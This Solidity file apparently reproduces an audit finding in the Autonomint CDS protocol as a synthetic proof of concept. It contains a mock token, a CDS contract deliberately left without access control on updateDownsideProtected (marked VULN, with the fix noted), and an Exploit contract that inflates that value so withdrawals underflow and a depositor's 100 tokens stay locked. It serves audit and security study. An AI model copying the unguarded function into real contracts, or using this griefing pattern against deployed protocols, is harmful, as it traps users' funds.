// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Autonomint CDS — updateDownsideProtected has no access control
    (Sherlock H-8, finding 45461). SYNTHETIC, cheatcode-free.
    Anyone can add to downsideProtected. deposit and withdraw both subtract it
    from totalCdsDepositedAmount. A value above the deposit underflows and
    reverts, so the depositor's 100 tokens cannot be withdrawn. (@> VULN) */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CDS {
    MockToken public token;
    address public admin;
    uint256 public downsideProtected;
    uint256 public totalCdsDepositedAmount;
    uint256 public totalCdsDepositedAmountWithOptionFees;
    mapping(address => uint256) public deposits;

    constructor(MockToken t, address a) {
        token = t;
        admin = a;
    }

    function updateDownsideProtected(uint128 downsideProtectedAmount) external {
        downsideProtected += downsideProtectedAmount; // @> VULN: no access control; any caller can push this above totalCdsDepositedAmount
        // FIX: require(msg.sender == admin)
    }

    function _updateCurrentTotalCdsDepositedAmount() private {
        if (downsideProtected > 0) {
            totalCdsDepositedAmount -= downsideProtected; // S5 underflows when downsideProtected exceeds deposits
            totalCdsDepositedAmountWithOptionFees -= downsideProtected;
            downsideProtected = 0;
        }
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount); // S2
        deposits[msg.sender] += amount;
        totalCdsDepositedAmount += amount;
        totalCdsDepositedAmountWithOptionFees += amount;
    }

    function withdraw() external {
        _updateCurrentTotalCdsDepositedAmount();
        uint256 amount = deposits[msg.sender];
        deposits[msg.sender] = 0;
        token.transfer(msg.sender, amount);
    }
}

contract Depositor {
    function approve(MockToken t, address spender) external {
        t.approve(spender, type(uint256).max);
    }

    function deposit(CDS cds, uint256 amount) external {
        cds.deposit(amount); // S3
    }

    function withdraw(CDS cds) external {
        cds.withdraw();
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    CDS public cds; // nonce 2
    Depositor public depositor; // nonce 3

    constructor() {
        token = new MockToken();
        cds = new CDS(token, address(this));
        depositor = new Depositor();
        token.mint(address(depositor), 100 ether);
        depositor.approve(token, address(cds));
    }

    function run() external {
        depositor.deposit(cds, 100 ether); // S1
        cds.updateDownsideProtected(uint128(101 ether)); // S4
        (bool ok,) = address(depositor).call(abi.encodeWithSignature("withdraw(address)", address(cds))); // S6
        require(cds.downsideProtected() == 101 ether, "set");
        require(!ok, "withdraw reverted");
        require(token.balanceOf(address(cds)) == 100 ether, "100 locked");
        require(token.balanceOf(address(depositor)) == 0, "depositor got nothing");
    }
}
